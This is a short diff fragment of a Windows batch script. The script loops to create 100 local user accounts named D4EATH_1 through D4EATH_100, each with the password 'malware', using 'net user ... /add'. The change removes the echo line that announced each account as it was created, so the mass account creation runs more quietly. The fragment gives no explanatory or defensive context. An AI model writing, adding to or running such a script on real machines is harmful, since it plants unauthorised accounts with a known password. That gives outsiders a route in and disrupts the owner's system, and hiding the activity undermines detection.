@@ -6,7 +6,7 @@ color 4F
 
 :: Loop to create users
 for /L %%i in (1,1,100) do (
-    echo Creating user D4EATH_%%i...
+    
     net user D4EATH_%%i malware /add
     if errorlevel 1 (
         
